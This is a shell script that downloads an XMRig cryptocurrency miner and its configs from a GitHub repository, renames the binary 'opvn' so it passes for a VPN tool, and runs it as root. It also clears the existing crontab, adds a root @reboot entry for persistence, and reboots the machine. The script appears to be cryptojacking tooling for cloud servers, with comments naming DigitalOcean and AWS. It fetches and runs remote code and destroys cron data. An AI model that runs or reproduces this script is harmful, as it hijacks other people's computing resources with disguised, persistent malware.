cd /home/*/
wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
tar -xzsf opme.tar.gz
mv xmrig* opvn
cd opvn/
mv xmr* opvn

rm -rf config.json
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
#wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/cronjob.sh
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/reboot.sh

wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.68
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.69
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.70
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.71
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.72
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.73
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.74
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.75
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.76
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.77
wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.78

#chmod +x opvn.sh
#chmod +x genconfig.sh
chmod +x cronjob.sh
chmod +x reboot.sh

crontab -r
#DO only
(crontab -u root -l; echo "@reboot cd /home/*/opvn && ./cronjob.sh" ) | crontab -u root -

# this cron for aws but not use
#(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && ./cronjob.sh" ) | crontab -u ubuntu -
chmod +x opvn
sudo ./opvn 2>&1 &

sleep 10

sudo reboot

#nohup sh opvn.sh > result.log 2>&1 &
